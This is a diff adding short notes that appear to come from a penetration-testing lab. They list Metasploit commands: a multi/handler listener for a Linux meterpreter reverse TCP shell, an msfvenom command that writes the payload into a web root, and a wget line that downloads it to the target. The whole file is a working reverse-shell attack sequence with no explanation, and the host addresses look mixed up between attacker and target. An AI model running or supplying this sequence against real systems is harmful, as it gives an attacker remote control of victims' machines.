@@ -1,0 +1,15 @@
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.59.130
+set LPORT 8883
+exploit
+
+
+kali 192.168.59.130
+gm 192.168.59.132
+
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp RHOST=192.168.59.130 RPORT=8883 -f elf > /var/www/html/payload.elf
+
+wget 192.168.59.132/payload.elf
+
